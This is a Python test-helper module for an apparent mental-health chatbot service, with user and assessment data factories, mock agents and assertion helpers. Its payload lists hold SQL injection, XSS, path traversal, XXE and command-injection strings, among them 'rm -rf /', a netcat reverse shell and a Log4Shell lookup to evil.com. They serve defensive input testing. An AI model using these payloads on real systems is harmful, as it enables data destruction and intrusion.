"""
Testing Utilities and Helper Functions
Provides common testing utilities, mock data factories, and helper functions
"""

import json
import secrets
import hashlib
from datetime import datetime, timedelta
from typing import Dict, Any, List, Optional
from unittest.mock import Mock, AsyncMock
from factory import Factory, Faker, SubFactory
from faker import Faker as FakerInstance

from src.auth.models import UserCreate, UserResponse, TokenData, Token
from src.config.security import SecurityConfig

# Initialize Faker instance
fake = FakerInstance()


class TestDataFactory:
    """Factory for generating test data"""
    
    @staticmethod
    def create_user_data(
        username: Optional[str] = None,
        email: Optional[str] = None,
        password: Optional[str] = None,
        role: str = "user",
        **kwargs
    ) -> Dict[str, Any]:
        """Create test user data"""
        return {
            "username": username or fake.user_name(),
            "email": email or fake.email(),
            "password": password or "TestPassword123!",
            "full_name": fake.name(),
            "role": role,
            **kwargs
        }
    
    @staticmethod
    def create_chat_message(
        message: Optional[str] = None,
        user_id: Optional[str] = None,
        metadata: Optional[Dict[str, Any]] = None
    ) -> Dict[str, Any]:
        """Create test chat message data"""
        return {
            "message": message or fake.sentence(nb_words=10),
            "user_id": user_id or fake.uuid4(),
            "metadata": metadata or {"context": "test", "timestamp": datetime.utcnow().isoformat()}
        }
    
    @staticmethod
    def create_assessment_data(
        assessment_type: str = "phq9",
        num_responses: int = 9
    ) -> Dict[str, Any]:
        """Create test assessment data"""
        responses = {}
        
        if assessment_type == "phq9":
            # PHQ-9 has 9 questions, scored 0-3
            responses = {str(i): fake.random_int(0, 3) for i in range(9)}
        elif assessment_type == "gad7":
            # GAD-7 has 7 questions, scored 0-3
            responses = {str(i): fake.random_int(0, 3) for i in range(7)}
        elif assessment_type == "big_five":
            # Big Five typically has 20-50 questions, scored 1-5
            responses = {str(i): fake.random_int(1, 5) for i in range(num_responses)}
        else:
            # Generic responses
            responses = {str(i): fake.random_int(0, 4) for i in range(num_responses)}
        
        return {
            "assessment_type": assessment_type,
            "responses": responses,
            "user_id": fake.uuid4()
        }
    
    @staticmethod
    def create_jwt_payload(
        user_id: Optional[str] = None,
        username: Optional[str] = None,
        role: str = "user",
        expire_minutes: int = 30
    ) -> Dict[str, Any]:
        """Create JWT payload for testing"""
        now = datetime.utcnow()
        return {
            "sub": user_id or fake.uuid4(),
            "username": username or fake.user_name(),
            "role": role,
            "permissions": SecurityConfig.USER_ROLES.get(role, ["read:profile"]),
            "exp": int((now + timedelta(minutes=expire_minutes)).timestamp()),
            "iat": int(now.timestamp()),
            "jti": fake.uuid4()
        }
    
    @staticmethod
    def create_malicious_payloads() -> Dict[str, List[str]]:
        """Create various malicious payloads for security testing"""
        return {
            "sql_injection": [
                "'; DROP TABLE users; --",
                "1' OR '1'='1",
                "admin'--",
                "'; SELECT * FROM users WHERE '1'='1",
                "1' UNION SELECT username, password FROM users--",
                "'; INSERT INTO users VALUES ('hacker', 'password'); --"
            ],
            "xss_payloads": [
                "<script>alert('xss')</script>",
                "<img src=x onerror=alert('xss')>",
                "javascript:alert('xss')",
                "<iframe src='javascript:alert(\"xss\")'></iframe>",
                "<svg onload=alert('xss')>",
                "';alert('xss');var a='",
                "<body onload=alert('xss')>"
            ],
            "command_injection": [
                "; ls -la",
                "| cat /etc/passwd",
                "&& rm -rf /",
                "`whoami`",
                "$(id)",
                "; ping -c 3 127.0.0.1",
                "| nc -e /bin/sh 127.0.0.1 4444"
            ],
            "path_traversal": [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "....//....//....//etc/passwd",
                "..//..//..//etc/passwd"
            ],
            "ldap_injection": [
                "admin)(&(password=*))",
                "admin)(!(&(objectClass=person)))",
                "*)(|(cn=*))",
                "admin)(|(password=*))"
            ],
            "xml_injection": [
                "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
                "<script>alert('xss')</script>",
                "]]></data><script>alert('xss')</script><data><![CDATA["
            ]
        }


class MockServiceFactory:
    """Factory for creating mock services"""
    
    @staticmethod
    def create_mock_user_service() -> Mock:
        """Create mock user service"""
        mock_service = Mock()
        
        # Configure authentication method
        mock_service.authenticate_user.return_value = UserResponse(
            id="test_user_id",
            username="testuser",
            email="test@example.com",
            full_name="Test User",
            role="user",
            is_active=True,
            created_at=datetime.utcnow(),
            last_login=datetime.utcnow()
        )
        
        # Configure registration method
        mock_service.register_user.return_value = UserResponse(
            id="new_user_id",
            username="newuser",
            email="new@example.com",
            full_name="New User",
            role="user",
            is_active=True,
            created_at=datetime.utcnow(),
            last_login=None
        )
        
        return mock_service
    
    @staticmethod
    def create_mock_chat_agent() -> AsyncMock:
        """Create mock chat agent"""
        mock_agent = AsyncMock()
        
        mock_agent.process_message.return_value = {
            "response": "I understand you're reaching out for support. How can I help you today?",
            "emotion": {"detected": "neutral", "confidence": 0.7},
            "metadata": {
                "response_type": "supportive",
                "safety_check": "passed",
                "escalation_needed": False
            }
        }
        
        return mock_agent
    
    @staticmethod
    def create_mock_diagnosis_agent() -> AsyncMock:
        """Create mock diagnosis agent"""
        mock_agent = AsyncMock()
        
        mock_agent.process_assessment.return_value = {
            "results": {
                "primary_indicators": ["mild_depression"],
                "severity_score": 8,
                "confidence": 0.75
            },
            "recommendations": [
                "Consider speaking with a mental health professional",
                "Practice self-care activities",
                "Maintain social connections"
            ],
            "severity": "mild",
            "next_steps": [
                "Monitor symptoms daily",
                "Schedule follow-up in 2 weeks",
                "Contact crisis line if symptoms worsen"
            ]
        }
        
        return mock_agent
    
    @staticmethod
    def create_mock_voice_module() -> AsyncMock:
        """Create mock voice module"""
        mock_module = AsyncMock()
        
        mock_module.transcribe_audio.return_value = {
            "text": "Hello, I need help with anxiety today",
            "confidence": 0.92,
            "language": "en",
            "duration": 3.5
        }
        
        mock_module.synthesize_speech.return_value = {
            "audio_data": "base64_encoded_audio_data_here",
            "duration": 2.8,
            "sample_rate": 22050,
            "format": "wav"
        }
        
        return mock_module


class TestAssertionHelpers:
    """Helper functions for common test assertions"""
    
    @staticmethod
    def assert_valid_user_response(response_data: Dict[str, Any]) -> None:
        """Assert that response contains valid user data structure"""
        required_fields = ["id", "username", "email", "role", "is_active", "created_at"]
        for field in required_fields:
            assert field in response_data, f"Missing required field: {field}"
        
        # Ensure sensitive data is not present
        sensitive_fields = ["password", "password_hash", "secret", "token"]
        for field in sensitive_fields:
            assert field not in response_data, f"Sensitive field present: {field}"
    
    @staticmethod
    def assert_valid_token_response(response_data: Dict[str, Any]) -> None:
        """Assert that response contains valid token structure"""
        required_fields = ["access_token", "token_type", "expires_in"]
        for field in required_fields:
            assert field in response_data, f"Missing required token field: {field}"
        
        assert response_data["token_type"] == "bearer"
        assert isinstance(response_data["expires_in"], int)
        assert len(response_data["access_token"]) > 20  # JWT tokens are long
    
    @staticmethod
    def assert_valid_chat_response(response_data: Dict[str, Any]) -> None:
        """Assert that response contains valid chat response structure"""
        required_fields = ["response", "user_id", "timestamp"]
        for field in required_fields:
            assert field in response_data, f"Missing required chat field: {field}"
        
        assert isinstance(response_data["response"], str)
        assert len(response_data["response"]) > 0
    
    @staticmethod
    def assert_valid_assessment_response(response_data: Dict[str, Any]) -> None:
        """Assert that response contains valid assessment response structure"""
        required_fields = ["assessment_type", "user_id", "results", "recommendations", "severity"]
        for field in required_fields:
            assert field in response_data, f"Missing required assessment field: {field}"
        
        assert response_data["assessment_type"] in ["phq9", "gad7", "big_five"]
        assert isinstance(response_data["recommendations"], list)
        assert isinstance(response_data["results"], dict)
    
    @staticmethod
    def assert_security_headers_present(headers: Dict[str, str]) -> None:
        """Assert that response contains required security headers"""
        required_security_headers = [
            "x-content-type-options",
            "x-frame-options", 
            "x-xss-protection"
        ]
        
        for header in required_security_headers:
            assert header in headers, f"Missing security header: {header}"
    
    @staticmethod
    def assert_no_sensitive_data_in_response(response_data: Any) -> None:
        """Assert that response doesn't contain sensitive data"""
        response_str = json.dumps(response_data).lower()
        
        sensitive_patterns = [
            "password", "secret", "key", "token", "jwt",
            "hash", "salt", "session", "cookie"
        ]
        
        for pattern in sensitive_patterns:
            assert pattern not in response_str, f"Sensitive data found: {pattern}"
    
    @staticmethod
    def assert_rate_limit_headers_present(headers: Dict[str, str]) -> None:
        """Assert that rate limiting headers are present"""
        rate_limit_headers = [
            "x-ratelimit-limit",
            "x-ratelimit-remaining", 
            "x-ratelimit-reset"
        ]
        
        # Not all implementations include these headers
        # This is informational for testing rate limiting feedback


class TestFileHelpers:
    """Helper functions for file-related testing"""
    
    @staticmethod
    def create_test_audio_file(file_format: str = "wav", size_bytes: int = 1024) -> bytes:
        """Create test audio file content"""
        if file_format == "wav":
            # Basic WAV header (44 bytes) + data
            header = b'RIFF' + (size_bytes - 8).to_bytes(4, 'little') + b'WAVE'
            header += b'fmt ' + (16).to_bytes(4, 'little') + b'\x01\x00\x01\x00'  # Format chunk
            header += (44100).to_bytes(4, 'little') + (88200).to_bytes(4, 'little')  # Sample rate
            header += b'\x02\x00\x10\x00data' + (size_bytes - 44).to_bytes(4, 'little')
            
            # Fill remaining bytes with audio data
            audio_data = b'\x00' * (size_bytes - 44)
            return header + audio_data
        
        elif file_format == "mp3":
            # Basic MP3 header
            header = b'\xFF\xFB\x90\x00'  # MP3 frame header
            data = b'\x00' * (size_bytes - 4)
            return header + data
        
        else:
            # Generic binary data
            return b'\x00' * size_bytes
    
    @staticmethod
    def create_malicious_file_content() -> bytes:
        """Create file content that might be malicious"""
        # File with embedded script content
        malicious_content = b'<script>alert("xss")</script>'
        # Add some binary data to make it look like a real file
        binary_data = b'\x89PNG\r\n\x1a\n' + b'\x00' * 100  # PNG header
        return binary_data + malicious_content


class TestPerformanceHelpers:
    """Helper functions for performance testing"""
    
    @staticmethod
    def measure_response_time(func, *args, **kwargs) -> tuple:
        """Measure function execution time"""
        import time
        start_time = time.time()
        result = func(*args, **kwargs)
        end_time = time.time()
        return result, end_time - start_time
    
    @staticmethod
    def assert_response_time(response_time: float, max_time: float = 2.0) -> None:
        """Assert that response time is within acceptable limits"""
        assert response_time < max_time, f"Response time {response_time:.3f}s exceeds limit {max_time}s"
    
    @staticmethod
    def create_load_test_data(num_requests: int = 100) -> List[Dict[str, Any]]:
        """Create data for load testing"""
        return [TestDataFactory.create_chat_message() for _ in range(num_requests)]


class DatabaseTestHelpers:
    """Helper functions for database testing (when database is implemented)"""
    
    @staticmethod
    def create_test_database_session():
        """Create test database session (placeholder for future implementation)"""
        # This will be implemented when database integration is added
        pass
    
    @staticmethod
    def cleanup_test_data():
        """Clean up test data from database (placeholder for future implementation)"""
        # This will be implemented when database integration is added
        pass


class MockResponseBuilder:
    """Builder for creating mock HTTP responses"""
    
    def __init__(self):
        self.status_code = 200
        self.headers = {}
        self.json_data = {}
    
    def with_status(self, status_code: int):
        """Set response status code"""
        self.status_code = status_code
        return self
    
    def with_header(self, key: str, value: str):
        """Add response header"""
        self.headers[key] = value
        return self
    
    def with_json(self, data: Dict[str, Any]):
        """Set JSON response data"""
        self.json_data = data
        return self
    
    def build(self) -> Mock:
        """Build mock response"""
        mock_response = Mock()
        mock_response.status_code = self.status_code
        mock_response.headers = self.headers
        mock_response.json.return_value = self.json_data
        return mock_response


class ValidationHelpers:
    """Helper functions for input validation testing"""
    
    @staticmethod
    def create_boundary_test_cases() -> Dict[str, List[Any]]:
        """Create boundary value test cases"""
        return {
            "empty_strings": ["", " ", "\t", "\n"],
            "long_strings": ["a" * 1000, "a" * 5000, "a" * 10000],
            "special_characters": ["!@#$%^&*()", "«»""''", "αβγδε", "🎭🎪🎨"],
            "numbers": [0, -1, 1, 999999, -999999, 0.0, -0.0],
            "unicode": ["\u0000", "\uffff", "\U0001F600", "\U0001F64F"],
            "sql_chars": ["'", '"', ";", "--", "/*", "*/"],
            "html_chars": ["<", ">", "&", "/", "="]
        }
    
    @staticmethod
    def create_edge_case_inputs() -> List[str]:
        """Create edge case inputs for testing"""
        return [
            None, "", " ", "\0", "\n", "\r\n", "\t",
            "a" * 1, "a" * 100, "a" * 1000, "a" * 10000,
            "🎭", "αβγ", "测试", "тест",
            "'DROP TABLE users;--",
            "<script>alert('xss')</script>",
            "${jndi:ldap://evil.com/a}",
            "../../../etc/passwd",
            "admin'--", "1' OR '1'='1"
        ]


# Export commonly used test data
COMMON_TEST_PASSWORDS = [
    "TestPassword123!",
    "SecurePass1@", 
    "ComplexPwd#9",
    "StrongAuth$7"
]

WEAK_TEST_PASSWORDS = [
    "weak", "password", "123456", "admin", 
    "pass", "test", "qwerty", "password123"
]

MALICIOUS_USERNAMES = [
    "admin'--", "'; DROP TABLE users; --", 
    "<script>alert('xss')</script>", "admin\x00user",
    "../../../etc/passwd", "$(whoami)", "`id`"
]

TEST_EMAIL_DOMAINS = [
    "@test.com", "@example.org", "@localhost.local",
    "@valid-domain.co.uk", "@sub.domain.net"
]

# Common test data generators
def generate_test_user(role: str = "user") -> Dict[str, Any]:
    """Generate a single test user"""
    return TestDataFactory.create_user_data(role=role)

def generate_test_users(count: int = 5) -> List[Dict[str, Any]]:
    """Generate multiple test users"""
    return [generate_test_user() for _ in range(count)]

def generate_malicious_inputs() -> Dict[str, List[str]]:
    """Generate malicious inputs for security testing"""
    return TestDataFactory.create_malicious_payloads()

def create_mock_app_state() -> Dict[str, Any]:
    """Create mock application state for testing"""
    return {
        "initialized": True,
        "app_manager": Mock(),
        "modules": {
            "chat_agent": MockServiceFactory.create_mock_chat_agent(),
            "diagnosis_agent": MockServiceFactory.create_mock_diagnosis_agent(),
            "voice_module": MockServiceFactory.create_mock_voice_module()
        }
    }